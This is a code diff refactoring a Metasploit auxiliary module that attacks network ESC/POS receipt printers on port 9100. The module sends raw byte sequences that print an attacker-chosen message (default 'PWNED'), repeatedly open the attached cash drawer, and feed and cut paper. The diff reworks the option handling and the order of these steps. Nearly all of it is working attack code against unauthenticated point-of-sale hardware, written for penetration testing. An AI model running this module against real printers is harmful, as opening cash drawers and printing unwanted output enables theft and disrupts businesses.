@@ -24,14 +24,13 @@ class MetasploitModule < Msf::Auxiliary
           'SideEffects' => [Metasploit::Module::SideEffects::IOC_IN_LOGS, Metasploit::Module::SideEffects::PHYSICAL_EFFECTS]
         }
       )
-  )
+    )
 
     register_options(
       [
         Opt::RPORT(9100),
-        OptString.new('MESSAGE', [true, 'Message to print', 'PWNED']),
+        OptString.new('MESSAGE', [false, 'Message to print', 'PWNED']),
         OptBool.new('TRIGGER_DRAWER', [false, 'Trigger the attached cash drawer', false]),
-        OptBool.new('PRINT_MESSAGE', [false, 'Print the specified message', false]),
         OptInt.new('DRAWER_COUNT', [true, 'Number of times to trigger the drawer', 1]),
         OptBool.new('CUT_PAPER', [false, 'Feed and cut the paper', false]),
         OptInt.new('FEED_LINES', [false, 'Number of lines to feed before cutting', 5])
@@ -47,34 +46,30 @@ class MetasploitModule < Msf::Auxiliary
   CUT_COMMAND = "\x1d\x56\x42\x00".freeze
 
   def run
-    rhost_ip = rhost
-    message = datastore['MESSAGE']
+    # Check if a message was provided by the user
+    should_print_message = !datastore['MESSAGE'].to_s.empty?
+
+    # Retrieve other options
     trigger_drawer = datastore['TRIGGER_DRAWER']
-    print_message = datastore['PRINT_MESSAGE']
     cut_paper = datastore['CUT_PAPER']
     feed_lines = datastore['FEED_LINES'].to_i.clamp(1, 100)
     drawer_count = datastore['DRAWER_COUNT'].to_i.clamp(1, 10)
 
-    unless print_message || trigger_drawer || cut_paper
-      print_error('No action specified. Please set at least one action to true.')
+    # Ensure at least one action is selected
+    unless should_print_message || trigger_drawer || cut_paper
+      print_error('No action specified. Please set MESSAGE, TRIGGER_DRAWER, or CUT_PAPER.')
       return
     end
 
     begin
       connect
-      print_status("Connected to printer at #{rhost_ip}")
+      print_status("Connected to printer at #{rhost}")
 
-      if print_message
+      if should_print_message
+        message = datastore['MESSAGE']
         print_commands = "\x1b\x40\x1b\x61\x01\x1d\x21\x11#{message}\x1d\x21\x00\n\x1b\x61\x00\n\n"
         sock.put(print_commands)
-        print_good('Printed message.')
-      end
-
-      if cut_paper
-        print_status("Feeding #{feed_lines} lines and cutting paper...")
-        sock.put(FEED_COMMAND + [feed_lines].pack('C'))
-        sock.put(CUT_COMMAND)
-        print_good('Paper fed and cut.')
+        print_good("Printed message: '#{message}'")
       end
 
       if trigger_drawer
@@ -85,8 +80,15 @@ class MetasploitModule < Msf::Auxiliary
         end
         print_good('Triggered cash drawer.')
       end
+
+      if cut_paper
+        print_status("Feeding #{feed_lines} lines and cutting paper...")
+        sock.put(FEED_COMMAND + [feed_lines].pack('C'))
+        sock.put(CUT_COMMAND)
+        print_good('Paper fed and cut.')
+      end
     rescue ::Rex::ConnectionError
-      print_error("Failed to connect to #{rhost_ip}")
+      print_error("Failed to connect to #{rhost}")
     ensure
       disconnect
     end
